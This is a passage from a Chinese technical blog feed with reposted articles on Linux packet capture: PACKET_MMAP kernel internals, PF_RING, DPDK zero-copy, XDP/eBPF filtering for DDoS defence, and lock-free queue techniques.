title="PACKET_MMAP源码分析"></a>PACKET_MMAP源码分析</h4><p>这里就不再像上一篇文章中那样大段大段的粘贴代码了，只是分析一下流程就可以了，需要的同学可以对照着follow一下代码;-)</p><p>数据包进入网卡后，创建了skb，之后会进入软中断处理，调用netif_receive_skb，并调用dev_add_pack注册的一些func。很明显可以看到af_packet.c中的tpacket_rcv和packet_rcv就是我们找的目标。</p><p>tpacket_rcv是PACKET_MMAP的实现，packet_rcv是普通AF_PACKET的实现。</p><p><strong>tpacket_rcv:</strong></p><ol><li><p>进行些必要的检查</p></li><li><p>运行run_filter，通过BPF过滤中我们设定条件的报文，得到需要捕获的长度snaplen</p></li><li><p>在ring buffer中查找TP_STATUS_KERNEL的frame</p></li><li><p>计算macoff、netoff等信息</p></li><li><p>如果snaplen+macoff&gt;frame_size，并且skb为共享的，那么就拷贝skb  &lt;一般不会拷贝&gt;</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-title">skb_shared</span>(<span class="hljs-variable">skb</span>))</span><br> <span class="hljs-function"><span class="hljs-title">skb_clone</span>()</span><br></code></pre></td></tr></table></figure></li><li><p>将数据从skb拷贝到kernel Buffer中  &lt;拷贝&gt;</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">skb<span class="hljs-constructor">_copy_bits(<span class="hljs-params">skb</span>, 0,  <span class="hljs-params">h</span>.<span class="hljs-params">raw</span>+<span class="hljs-params">macoff</span>, <span class="hljs-params">snaplen</span>)</span>;<br></code></pre></td></tr></table></figure></li><li><p>设置拷贝到frame中报文的头部信息，包括时间戳、长度、状态等信息</p></li><li><p>flush_dcache_page()把某页在data cache中的内容同步回内存。<br>x86应该不用这个，这个多为RISC架构用的</p></li><li><p>调用sk_data_ready，通知睡眠进程，调用poll</p></li><li><p>应用层在调用poll返回后，就会调用pcap_get_ring_frame获得一个frame进行处理。这里面没有拷贝也没有系统调用。<br>开销分析：1次拷贝+1个系统调用(poll)</p></li></ol><p><strong>packet_rcv:</strong></p><ol><li><p>进行些必要的检查</p></li><li><p>运行run_filter，通过BPF过滤中我们设定条件的报文，得到需要捕获的长度snaplen</p></li><li><p>如果skb为共享的，那么就拷贝skb  &lt;一般都会拷贝&gt;</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-title">skb_shared</span>(<span class="hljs-variable">skb</span>))</span><br> <span class="hljs-function"><span class="hljs-title">skb_clone</span>()</span><br></code></pre></td></tr></table></figure></li><li><p>设置拷贝到frame中报文的头部信息，包括时间戳、长度、状态等信息</p></li><li><p>将skb追加到socket的sk_receive_queue中</p></li><li><p>调用sk_data_ready，通知睡眠进程有数据到达</p></li><li><p>应用层睡眠在recvfrom上，当数据到达，socket可读的时候，调用packet_recvmsg，其中将数据拷贝到用户空间。  &lt;拷贝&gt;</p></li></ol><blockquote><p>skb_recv_datagram()从sk_receive_queue中获得skb</p><p>skb_copy_datagram_iovec()将数据拷贝到用户空间</p></blockquote><p><strong>开销分析：2次拷贝+1个系统调用(recvfrom)</strong></p><p>注:其实在packet处理之前还有一次拷贝过程，在NIC Driver中，创建一个skb，然后NIC把数据DMA到skb的data中。</p><p>在另外一些ZeroCopy实现中(例如 ntz)，如果不希望NIC数据进入协议栈的话，就可以不用考虑skb_shared的问题了，直接将数据从NIC Driver中DMA到制定的一块内存，然后使用mmap到用户空间。这样就只有一次DMA过程，当然DMA也是一种拷贝;-)</p><p>关于数据包如何从NIC Driver到packet_rcv&#x2F;tpacket_rcv，数据包经过中断、软中断等处理，进入netif_receive_skb中对skb进行分发，就会调用dev_add_pack注册的packet_type-&gt;func。</p><h3 id="3-5-DPDK"><a href="#3-5-DPDK" class="headerlink" title="3.5 DPDK"></a>3.5 DPDK</h3><p>参考：<a href="https://www.jianshu.com/p/9b669f7c97ce">DPDK解析—–DPDK，PF_RING对比</a></p><p>pf-ring zc和dpdk均可以实现数据包的零拷贝，两者均旁路了内核，但是实现原理略有不同。pf-ring zc通过zc驱动（也在应用层）接管数据包，dpdk基于UIO实现。</p><h4 id="UIO-mmap-实现零拷贝（zero-copy）"><a href="#UIO-mmap-实现零拷贝（zero-copy）" class="headerlink" title="UIO+mmap 实现零拷贝（zero copy）"></a>UIO+mmap 实现零拷贝（zero copy）</h4><p>UIO（Userspace I&#x2F;O）是运行在用户空间的I&#x2F;O技术。Linux系统中一般的驱动设备都是运行在内核空间，而在用户空间用应用程序调用即可，而UIO则是将驱动的很少一部分运行在内核空间，而在用户空间实现驱动的绝大多数功能。<br>采用Linux提供UIO机制，可以旁路Kernel，将所有报文处理的工作在用户空间完成。</p><p><img src="https://img-blog.csdnimg.cn/20201025161801443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="UIO-PMD-减少中断和CPU上下文切换"><a href="#UIO-PMD-减少中断和CPU上下文切换" class="headerlink" title="UIO+PMD 减少中断和CPU上下文切换"></a>UIO+PMD 减少中断和CPU上下文切换</h4><p>DPDK的UIO驱动屏蔽了硬件发出中断，然后在用户态采用主动轮询的方式，这种模式被称为PMD（Poll Mode Driver）。</p><p>与DPDK相比，pf-ring（no zc）使用的是NAPI polling和应用层polling，而pf-ring zc与DPDK类似，仅使用应用层polling。</p><h4 id="HugePages-减少TLB-miss"><a href="#HugePages-减少TLB-miss" class="headerlink" title="HugePages 减少TLB miss"></a>HugePages 减少TLB miss</h4><p>在操作系统引入MMU（Memory Management Unit）后，CPU读取内存的数据需要两次访问内存。第一次要查询页表将逻辑地址转换为物理地址，然后访问该物理地址读取数据或指令。</p><p>为了减少页数过多，页表过大而导致的查询时间过长的问题，便引入了TLB(Translation Lookaside Buffer)，可翻译为地址转换缓冲器。TLB是一个内存管理单元，一般存储在寄存器中，里面存储了当前最可能被访问到的一小部分页表项。</p><p>引入TLB后，CPU会首先去TLB中寻址，由于TLB存放在寄存器中，且其只包含一小部分页表项，因此查询速度非常快。若TLB中寻址成功（TLB hit），则无需再去RAM中查询页表；若TLB中寻址失败（TLB miss），则需要去RAM中查询页表，查询到后，会将该页更新至TLB中。</p><p>而DPDK采用HugePages ，在x86-64下支持2MB、1GB的页大小，大大降低了总页个数和页表的大小，从而大大降低TLB miss的几率，提升CPU寻址性能。</p><h5 id="其它优化"><a href="#其它优化" class="headerlink" title="其它优化"></a>其它优化</h5><p>SNA（Shared-nothing Architecture），软件架构去中心化，尽量避免全局共享，带来全局竞争，失去横向扩展的能力。NUMA体系下不跨Node远程使用内存。</p><p>SIMD（Single Instruction Multiple Data），从最早的mmx&#x2F;sse到最新的avx2，SIMD的能力一直在增强。DPDK采用批量同时处理多个包，再用向量编程，一个周期内对所有包进行处理。比如，memcpy就使用SIMD来提高速度。<br>cpu affinity</p><h3 id="3-6-XDP-eXpress-Data-Path"><a href="#3-6-XDP-eXpress-Data-Path" class="headerlink" title="3.6 XDP(eXpress Data Path)"></a>3.6 XDP(eXpress Data Path)</h3><p>参考：<a href="https://cloud.tencent.com/developer/article/1484793">DPDK and XDP</a></p><p>xdp代表eXpress数据路径，使用ebpf 做包过滤，相对于dpdk将数据包直接送到用户态，用用户态当做快速数据处理平面，xdp是在驱动层创建了一个数据快速平面。</p><p>在数据被网卡硬件dma到内存，分配skb之前，对数据包进行处理。</p><p><img src="https://img-blog.csdnimg.cn/20201025161821775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><p>请注意，XDP并没有对数据包做Kernel bypass，它只是提前做了一点预检而已。</p><p><strong>相对于DPDK，XDP具有以下优点：</strong></p><ul><li>无需第三方代码库和许可</li><li>同时支持轮询式和中断式网络</li><li>无需分配大页</li><li>无需专用的CPU</li><li>无需定义新的安全网络模型</li></ul><p><strong>XDP的使用场景包括：</strong></p><ul><li>DDoS防御</li><li>防火墙</li><li>基于XDP_TX的负载均衡</li><li>网络统计</li><li>复杂网络采样</li><li>高速交易平台</li></ul><h2 id="PS：使用XDP-eXpress-Data-Path-防御DDoS攻击"><a href="#PS：使用XDP-eXpress-Data-Path-防御DDoS攻击" class="headerlink" title="PS：使用XDP(eXpress Data Path)防御DDoS攻击"></a>PS：使用XDP(eXpress Data Path)防御DDoS攻击</h2><p><a href="https://blog.csdn.net/dog250/article/details/77993218">https://blog.csdn.net/dog250/article/details/77993218</a></p><p>​       人们总是觉得<strong>Linux协议栈实现得不够好</strong>，特别是性能方面，所以在这种不信任的基调下，人们当然很自信地觉得把数据包从协议栈里拉出来，自己会处理得比内核协议栈要好，但是，真的是这样吗？我来猜测几点背后的原因。</p><p>  首先，这可能是因为Linux协议栈是作为内核一个子系统套件存在的，它无法脱离内核作为一个模块存在，这就意味着如果你改了其实现的细节，就必然要重新编译内核并重启系统，别看这么简单的一个操作，对于很多线上系统是吃不消的，这就跟Windows装完软件要重启系统(重启系统仅仅就是为了重新加载注册表，windows设计者是省事了，用户烦死了！)一样烦人，所以，人们自然而然地需要一种动态HOOK的机制，在里面可以实现一些自己的逻辑。</p><p>  其次，Linux内核协议栈说实话真的扛不住高并发，大流量，特别是它是在20世纪90年代作为一个通用操作系统实现的，只是后来从Linux社区迸发的一种文化让其逐渐深入各个专业的领域，比如大型服务器，专用网络设备等，这必然存在一个逐步进化的过程。一句话，Linux的协议栈不是为1Gbps&#x2F;10Gbps&#x2F;40Gbps这些网络设计的，要想支持它们，你就必须自己做点什么。</p><h3 id="新的分层方法"><a href="#新的分层方法" class="headerlink" title="新的分层方法"></a>新的分层方法</h3><p>很多人会把Linux协议栈的实现按照OSI模型或者TCP&#x2F;IP模型分成对应的层次，比如什么链路层，IP层，TCP层。其实这根本不对，Linux协议栈实现从链路层通用处理到IP层路由，并没有经过什么显式的关卡一样的门，仅仅支持一些函数调用而已。</p><p>记住，OSI模型也好，TCP&#x2F;IP模型也罢，所谓的分层仅仅是逻辑视图上的分层，好在让人们便于理解以及便于界定软件设计的边界和分工，所以可以说，逻辑上分层这些层次之间都是隐式的门，然而在性能攸关的实现领域，显式的门处在完全不同的位置！</p><p>  如果谈优化，我们就必须要找到显式的门，找到了门，绕过它便是优化！</p><p>  所以说，我之前的那些想法，比如在Netfilter的PREROUTING上做更多的事，优化效果并不明显，就是因为Netfilter并不是门，它也只是一些函数调用。</p><p>  那么，什么是门？所谓的门，就是那些开销巨大，你必须花点代价才能过去的点。举几个例子，必须用户态到内核态的系统调用，比如套接字处理的自旋锁，比如内存分配，或者说现实中的深圳罗湖口岸，深圳布吉关，梅林关…</p><p>  按照以上的说法，我来重新把Linux协议栈来分层，有了这个新的层次，在哪里做优化就显而易见了(红色区域开销巨大，是为”门“)：</p><p><img src="https://img-blog.csdnimg.cn/20201025165720535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><p>我们看到数据包从接收一直到用户态，主要经历了两个门，其中一个是<em><strong>skb分配</strong>，另一个是</em>*套接字锁定**，在之前那篇《<a href="http://blog.csdn.net/dog250/article/details/77920696">SYNPROXY抵御DDoS攻击的原理和优化</a>》文章中，我采用的方法显然是绕开了套接字锁定，抗DDoS的性能便得到了很大的提升，然而纵观我几乎所有的文章，基本上都是绕此门而优化的。因为这是一种便宜的方案。</p><h3 id="绕过更低层的门"><a href="#绕过更低层的门" class="headerlink" title="绕过更低层的门"></a>绕过更低层的门</h3><p>早在2014年时，接触过一段时间netmap，当时还调研了基于Tilera做网络处理加速，不管怎样，这些都是跟DPDK类似的方案，DPDK应该都听说过，Intel的一个被吵得火热烫手的专用框架。</p><p>  既然大家都一样，Intel是老大，自然就没有Tilera什么事了(它们的方案又贵，又晦涩)，这就是DPDK被炒火的原因，Intel之类的公司，放个屁都是香的。</p><p>  其实，类似DPDK的加速方案原理都非常简单，那就是完全绕开内核实现的协议栈，把数据包直接从网卡拉到用户态，依靠Intel自身处理器的一些专门优化，来高速处理数据包，你可知道在这类方案中，CPU可是专门处理数据包的，什么内核态，用户态，都无关紧要，采用map机制，专门的处理程序可以非常高效地在任意时间读取并处理数据包，想想CPU的处理速度换算成pps是什么概念吧，如果一个CPU什么都不干，专门处理数据包，那将是非常猛的线速处理了。</p><p>  DPDK没什么大不了的，就跟当年的EJB一样，全靠厂商推动，依赖的是一揽子方案，并非一个朴素通用的框架。你给DPDK做个手术跑在ARM上试试，就算能跑，很多功能也都是废的。</p><p>  总之，在skb还未分配的网卡驱动层面做一些事情是必要的，至于怎么做，做什么，那花样就多了去了。</p><h3 id="XDP"><a href="#XDP" class="headerlink" title="XDP"></a>XDP</h3><p>《<a href="https://rtoax.blog.csdn.net/article/details/108993870#XDP%E6%9E%84%E9%80%A0">Linux eBPF和XDP高速处理数据包；使用EBPF编写XDP网络过滤器；高性能ACL</a>》</p><p>《<a href="https://rtoax.blog.csdn.net/article/details/108993500">介绍Calico eBPF数据平面：Linux内核网络、安全性和跟踪（Kubernetes、kube-proxy</a>）》</p><p>《<a href="https://rtoax.blog.csdn.net/article/details/108990364">eBPF.io eBPF文档：扩展的数据包过滤器（BPF）</a>》</p><p>解释一个名词，XDP的意思是eXpress Data Path。它能做什么呢？很简单，下图说明：</p><p><img src="https://img-blog.csdnimg.cn/20201025165806776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbmdfVG9h,size_16,color_FFFFFF,t_70" alt="img"></p><p>其中，最显而易见的是，竟然可以在如此低的层面上把数据包丢弃或者回弹回去，如果面临DDoS攻击，采用这种方式的话，数据包就没有必要上升到Netfilter层面再被丢弃了。说白了，XDP允许数据包在进入Linux协议栈之前就能受到判决。</p><p>  别的不管，我只管DDoS防护，现在的问题是XDP靠什么机制知道这个数据包是不是要被丢弃的呢？</p><p>  <strong>eBPF！</strong><br>  事实上，这相当于在网卡驱动层面运行了一个eBPF程序，该程序决定数据包何去何从。最简单的想法是，假设1000个IP地址是已知的异常地址，我们将其封装在一个高效的查找结构中，然后将这个结构包括查找过程编译成eBPF字节码并注入到网卡，网卡收到数据包后，运行该eBPF字节码，如果数据包源IP地址被找到，则丢弃！</p><p>这不就是n+1模型以及iptables的bpf match中需要的效果吗:</p><ul><li>《<a href="http://blog.csdn.net/dog250/article/details/77790504">使用iptables的bpf match来优化规则集-HiPAC&#x2F;ipset&#x2F;n+1模型之外的方法</a>》</li><li>《<a href="http://blog.csdn.net/dog250/article/details/77618319">iptables高性能前端优化-无压力配置1w+条规则</a>》</li></ul><p>更加令人兴奋的是，这一切竟然本来就是存在的现成的东西。推荐几个链接：</p><p><a href="https://netdevconf.org/2.1/slides/apr6/bertin_Netdev-XDP.pdf">https://netdevconf.org/2.1/slides/apr6/bertin_Netdev-XDP.pdf</a><br><a href="https://netdevconf.org/2.1/papers/Gilberto_Bertin_XDP_in_practice.pdf">https://netdevconf.org/2.1/papers/Gilberto_Bertin_XDP_in_practice.pdf</a><br><a href="https://github.com/netoptimizer/prototype-kernel">https://github.com/netoptimizer/prototype-kernel</a><br><a href="https://www.iovisor.org/technology/xdp">https://www.iovisor.org/technology/xdp</a><br>以往，我们认为内核是确定的程序，我们能喂给它的只有数据，虽然Linux内核大部分都跑在冯诺依曼架构为主(如今基本都是混合架构)的机器上，但这种认知反而更像是哈佛架构，冯诺依曼机器本来就是程序和数据统一存储的，现在，eBPF程序可以被灌入网卡驱动了，这简直就跟网卡硬件的Firmware一样为网卡注入了新的功能。不管是你认为程序已经数据化了，还是这种方案真的回归了冯诺依曼模型，都无所谓，重要的是，它提升了性能。</p><p>  请注意，XDP并没有对数据包做Kernel bypass，它只是提前做了一点预检而已，目前它也只能有三种Action，继续去挂号，直接杀掉，或者打道回府，看来这只是减少了挂号服务生的负担…这与DPDK这种半道黄牛是完全不同的，DPDK完全可能把你拉到一个黑诊所…不过，XDP思路非常清晰，后续的可能性谁也无法预估，说不定真有一天XDP会直接接管路由查找甚至TCP握手处理呢。</p><p>  本节的最后，再一次提一下一个熟悉的朋友，那就是Cisco的ACL，我一直都觉得在Cisco的中低端设备上，ACL的匹配就是按照XDP的方式做的，把用户输入的ACL规则编译成eBPF之类的字节码，然后灌入到需要使能的网卡上，我想象不出除了这种方式，还能有什么更高效的方式，也希望Cisco的朋友能有机会告知究竟…</p><h2 id="4-无锁队列技术"><a href="#4-无锁队列技术" class="headerlink" title="4.无锁队列技术"></a>4.无锁队列技术</h2><p>《<a href="https://rtoax.blog.csdn.net/article/details/101508279">【共享内存】基于共享内存的无锁消息队列设计</a>》</p><p>《<a href="https://rtoax.blog.csdn.net/article/details/108203912">DPDK无锁队列rte_ring相关代码及示例程序（rte_ring.h，rte_ring.c，main.c，makefile）</a>》</p><p>《<a href="https://coolshell.cn/articles/8239.html">无锁队列的实现</a>》</p><p>《<a href="https://rtoax.blog.csdn.net/article/details/107614630">DPDK ring库：环形缓冲区的解剖</a>》</p><p>在报文捕获的流程中，无锁队列是一个很重要的数据结构。生产者（网卡）写数据和消费者（用户态程序）读数据，不加锁，能极大提升效率。</p><p>无锁队列实现主要依赖的技术有：</p><ul><li>CAS原子指令操作</li><li>内存屏障</li></ul><h3 id="CAS原子指令操作"><a href="#CAS原子指令操作" class="headerlink" title="CAS原子指令操作"></a>CAS原子指令操作</h3><p>CAS（Compare and Swap，比较并替换）原子指令，用来保障数据的一致性。</p><p>指令有三个参数，当前内存值 V、旧的预期值 A、更新的值 B，当且仅当预期值 A和内存值 V相同时，将内存值修改为 B并返回true，否则什么都不做，并返回false。</p><h3 id="内存屏障"><a href="#内存屏障" class="headerlink" title="内存屏障"></a>内存屏障</h3><p>执行运算的时候，每个CPU核心从内存读到各自的缓存中，结束后再从缓存更新到内存，这会引起线程间数据的不同步，故需要内存屏障强制把写缓冲区或高速缓存中的数据等写回主内存。</p><p>主要分为读屏障和写屏障：读屏障可以让 cache中的数据失效，强制重新从主内存加载数据；</p><p>写屏障能使cache 中的数据更新写入主内存。</p><p>在实现 valotitle关键字中就用到了内存屏障，从而保证线程A对此变量的修改，其他线程获取的值为最新的值。</p><h2 id="5-基于pfring-x2F-dpdk的应用"><a href="#5-基于pfring-x2F-dpdk的应用" class="headerlink" title="5.基于pfring&#x2F;dpdk的应用"></a>5.基于pfring&#x2F;dpdk的应用</h2><p>按照传统的观念，中间网络节点只能按照协议栈的层次一层一层地解析数据包，所谓路由器是三层设备，交换机是二层设备，防火墙分为二层防火墙和三层防火墙。</p><p>使用PF_RING&#x2F;DPDK的设备，它可以将数据包直接从网卡的芯片DMA到你机器上的内存，然后你通过一个应用程序而不是内核协议栈来处理数据包。</p><p>至于说你的应用程序怎么处置数据包，列举几个：</p><p>1.深度解析数据包，按照各种你可以想到的粒度来解析会话，然后记录审计信息；<br>2.提供高性能的入侵检测功能；<br>3.转发数据包，按照路由器的方式。但是不再仅仅通过查询路由表的方式进行IP路由，而是可以通过各种各样的方式，转发表完全由你自己定义，比如实现一个通用的SDN流表；<br>4.根据上面第2点的含义，你可以决定哪些包被丢弃，这就是一个高性能的防火墙。<br>相比内核协议栈的串行解决方案，使用PF_RING&#x2F;DPDK是一个更加高效的方案，不但高效，而且灵活。如果你拥有多核心的处理器，你甚至可以在用户态并行处理数据包的各个层信息。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>《<a href="https://coolshell.cn/articles/8239.html">无锁队列的实现</a>》</p><p>《<a href="https://cloud.tencent.com/developer/article/1521276">PF_RING</a>》</p><p>《<a href="https://blog.csdn.net/dandelionj/article/details/16980571">PACKET_MMAP实现原理分析</a>》</p><p>《<a href="https://my.oschina.net/moooofly/blog/898798">【原创】图解抓包</a>》</p><p>《<a href="https://blog.csdn.net/dog250/article/details/77993218">使用XDP(eXpress Data Path)防御DDoS攻击</a>》</p><p>《<a href="https://blog.csdn.net/gengzhikui1992/article/details/103142848">linux报文高速捕获技术对比–napi&#x2F;libpcap&#x2F;afpacket&#x2F;pfring&#x2F;dpdk&#x2F;xdp</a>》</p><p><a href="https://rtoax.blog.csdn.net/article/details/108993870#XDP%E6%9E%84%E9%80%A0">Linux eBPF和XDP高速处理数据包；使用EBPF编写XDP网络过滤器；高性能ACL</a></p><p><a href="https://rtoax.blog.csdn.net/article/details/108993500">介绍Calico eBPF数据平面：Linux内核网络、安全性和跟踪（Kubernetes、kube-proxy）</a></p><p>《<a href="https://rtoax.blog.csdn.net/article/details/108990364">eBPF.io eBPF文档：扩展的数据包过滤器（BPF）</a>》</p><p>《<a href="https://rtoax.blog.csdn.net/article/details/108897178">iptables详解（1）：iptables概念</a>》</p><p>《<a href="https://rtoax.blog.csdn.net/article/details/108897396">iptables详解（2）：路由表</a>》</p><p>《<a href="https://rtoax.blog.csdn.net/article/details/101508279">【共享内存】基于共享内存的无锁消息队列设计</a>》</p><p>《<a href="https://rtoax.blog.csdn.net/article/details/108203912">DPDK无锁队列rte_ring相关代码及示例程序（rte_ring.h，rte_ring.c，main.c，makefile）</a>》</p><p>《<a href="https://coolshell.cn/articles/8239.html">无锁队列的实现</a>》</p><p>《<a href="https://rtoax.blog.csdn.net/article/details/107614630">DPDK ring库：环形缓冲区的解剖</a>》</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux经典的几款抓包技术实现</title>
    <link href="/2022/11/04/%E7%BB%8F%E5%85%B8%E7%9A%84%E5%87%A0%E6%AC%BE%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/"/>
    <url>/2022/11/04/%E7%BB%8F%E5%85%B8%E7%9A%84%E5%87%A0%E6%AC%BE%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"># Linux 经典的几款抓包技术实现<blockquote><p>装载自网络安全研发随想，原文链接：<a href="https://z.itpub.net/article/detail/E7282132F901DCA52E32EB06F25D6CF2">https://z.itpub.net/article/detail/E7282132F901DCA52E32EB06F25D6CF2</a>.</p></blockquote><p>本文列举四个比较经典的 Linux 抓包技术实现，如果还有其他你觉得ok的可以留言。这四个分别是：</p><ul><li>libpcap&#x2F;libpcap-mmap</li><li>PF_RING</li><li>DPDK</li><li>xdp</li></ul><h2 id="libpcap"><a href="#libpcap" class="headerlink" title="libpcap"></a>libpcap</h2><p>libpcap的包捕获机制是在数据链路层增加一个旁路处理，不干扰系统自身的网路协议栈的处理，对发送和接收的数据包通过Linux内核做过滤和缓冲处理，后直接传递给上层应用程序。</p><ol><li>数据包到达网卡设备。</li><li>网卡设备依据配置进行DMA操作。（ <strong>「第1次拷贝」</strong> ：网卡寄存器-&gt;内核为网卡分配的缓冲区ring buffer）</li><li>网卡发送中断，唤醒处理器。</li><li>驱动软件从ring buffer中读取，填充内核skbuff结构（ <strong>「第2次拷贝」</strong> ：内核网卡缓冲区ring buffer-&gt;内核专用数据结构skbuff）</li><li>接着调用netif_receive_skb函数：</li></ol><ul><li>5.1 如果有抓包程序，由网络分接口进入BPF过滤器，将规则匹配的报文拷贝到系统内核缓存 （ <strong>「第3次拷贝」</strong> ）。BPF为每一个要求服务的抓包程序关联一个filter和两个buffer。BPF分配buffer 且通常情况下它的额度是4KB the store buffer 被使用来接收来自适配器的数据；the hold buffer被使用来拷贝包到应用程序。</li><li>5.2 处理数据链路层的桥接功能；</li><li>5.3 根据skb-&gt;protocol字段确定上层协议并提交给网络层处理，进入网络协议栈，进行高层处理。</li></ul><p>libpcap绕过了Linux内核收包流程中协议栈部分的处理，使得用户空间API可以直接调用套接字PF_PACKET从链路层驱动程序中获得数据报文的拷贝，将其从内核缓冲区拷贝至用户空间缓冲区（ <strong>「第4次拷贝」</strong> ）</p><h2 id="libpcap-mmap"><a href="#libpcap-mmap" class="headerlink" title="libpcap-mmap"></a>libpcap-mmap</h2><p>libpcap-mmap是对旧的libpcap实现的改进，新版本的libpcap基本都采用packet_mmap机制。PACKET_MMAP通过mmap，减少一次内存拷贝（ <strong>「第4次拷贝没有了」</strong> ），减少了频繁的系统调用，大大提高了报文捕获的效率。</p><h2 id="PF-RING"><a href="#PF-RING" class="headerlink" title="PF_RING"></a>PF_RING</h2><p>我们看到之前libpcap有4次内存拷贝。libpcap_mmap有3次内存拷贝。PF_RING提出的核心解决方案便是减少报文在传输过程中的拷贝次数。</p><p>我们可以看到，相对与libpcap_mmap来说，pfring允许用户空间内存直接和rx_buffer做mmap。这又减少了一次拷贝 （ <strong>「libpcap_mmap的第2次拷贝」</strong> ：rx_buffer-&gt;skb）</p><p>PF-RING ZC实现了DNA（Direct NIC Access 直接网卡访问）技术，将用户内存空间映射到驱动的内存空间，使用户的应用可以直接访问网卡的寄存器和数据。</p><p>通过这样的方式，避免了在内核对数据包缓存，减少了一次拷贝（ <strong>「libpcap的第1次拷贝」</strong> ，DMA到内核缓冲区的拷贝）。这就是完全的零拷贝。</p><p>其缺点是，只有一个 应用可以在某个时间打开DMA ring（请注意，现在的网卡可以具有多个RX &#x2F; TX队列，从而就可以在每个队列上同时一个应用程序），换而言之，用户态的多个应用需要彼此沟通才能分发数据包。</p><h2 id="DPDK"><a href="#DPDK" class="headerlink" title="DPDK"></a>DPDK</h2><p>pf-ring zc和dpdk均可以实现数据包的零拷贝，两者均旁路了内核，但是实现原理略有不同。pf-ring zc通过zc驱动（也在应用层）接管数据包，dpdk基于UIO实现。</p><h3 id="1-UIO-mmap-实现零拷贝（zero-copy）"><a href="#1-UIO-mmap-实现零拷贝（zero-copy）" class="headerlink" title="1 UIO+mmap 实现零拷贝（zero copy）"></a>1 UIO+mmap 实现零拷贝（zero copy）</h3><p>UIO（Userspace I&#x2F;O）是运行在用户空间的I&#x2F;O技术。Linux系统中一般的驱动设备都是运行在内核空间，而在用户空间用应用程序调用即可，而UIO则是将驱动的很少一部分运行在内核空间，而在用户空间实现驱动的绝大多数功能。采用Linux提供UIO机制，可以旁路Kernel，将所有报文处理的工作在用户空间完成。</p><h3 id="2-UIO-PMD-减少中断和CPU上下文切换"><a href="#2-UIO-PMD-减少中断和CPU上下文切换" class="headerlink" title="2 UIO+PMD 减少中断和CPU上下文切换"></a>2 UIO+PMD 减少中断和CPU上下文切换</h3><p>DPDK的UIO驱动屏蔽了硬件发出中断，然后在用户态采用主动轮询的方式，这种模式被称为PMD（Poll Mode Driver）。</p><p>与DPDK相比，pf-ring（no zc）使用的是NAPI polling和应用层polling，而pf-ring zc与DPDK类似，仅使用应用层polling。</p><h3 id="3-HugePages-减少TLB-miss"><a href="#3-HugePages-减少TLB-miss" class="headerlink" title="3 HugePages 减少TLB miss"></a>3 HugePages 减少TLB miss</h3><p>在操作系统引入MMU（Memory Management Unit）后，CPU读取内存的数据需要两次访问内存。次要查询页表将逻辑地址转换为物理地址，然后访问该物理地址读取数据或指令。</p><p>为了减少页数过多，页表过大而导致的查询时间过长的问题，便引入了TLB(Translation Lookaside Buffer)，可翻译为地址转换缓冲器。TLB是一个内存管理单元，一般存储在寄存器中，里面存储了当前可能被访问到的一小部分页表项。</p><p>引入TLB后，CPU会首先去TLB中寻址，由于TLB存放在寄存器中，且其只包含一小部分页表项，因此查询速度非常快。若TLB中寻址成功（TLB hit），则无需再去RAM中查询页表；若TLB中寻址失败（TLB miss），则需要去RAM中查询页表，查询到后，会将该页更新至TLB中。</p><p>而DPDK采用HugePages ，在x86-64下支持2MB、1GB的页大小，大大降低了总页个数和页表的大小，从而大大降低TLB miss的几率，提升CPU寻址性能。</p><h3 id="4-其它优化"><a href="#4-其它优化" class="headerlink" title="4 其它优化"></a>4 其它优化</h3><ul><li>SNA（Shared-nothing Architecture），软件架构去中心化，尽量避免全局共享，带来全局竞争，失去横向扩展的能力。NUMA体系下不跨Node远程使用内存。</li><li>SIMD（Single Instruction Multiple Data），从早的mmx&#x2F;sse到新的avx2，SIMD的能力一直在增强。DPDK采用批量同时处理多个包，再用向量编程，一个周期内对所有包进行处理。比如，memcpy就使用SIMD来提高速度。</li><li>cpu affinity：即 CPU 亲和性</li></ul><h2 id="XDP"><a href="#XDP" class="headerlink" title="XDP"></a>XDP</h2><p>xdp代表eXpress数据路径，使用ebpf 做包过滤，相对于dpdk将数据包直接送到用户态，用用户态当做快速数据处理平面，xdp是在驱动层创建了一个数据快速平面。在数据被网卡硬件dma到内存，分配skb之前，对数据包进行处理。</p><p>请注意，XDP并没有对数据包做Kernel bypass，它只是提前做了一点预检而已。</p><p>相对于DPDK，XDP具有以下优点：</p><ul><li>无需第三方代码库和许可</li><li>同时支持轮询式和中断式网络</li><li>无需分配大页</li><li>无需专用的CPU</li><li>无需定义新的安全网络模型</li></ul><p>XDP的使用场景包括：</p><ul><li>DDoS防御</li><li>防火墙</li><li>基于XDP_TX的负载均衡</li><li>网络统计</li><li>复杂网络采样</li><li>高速交易平台</li></ul>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
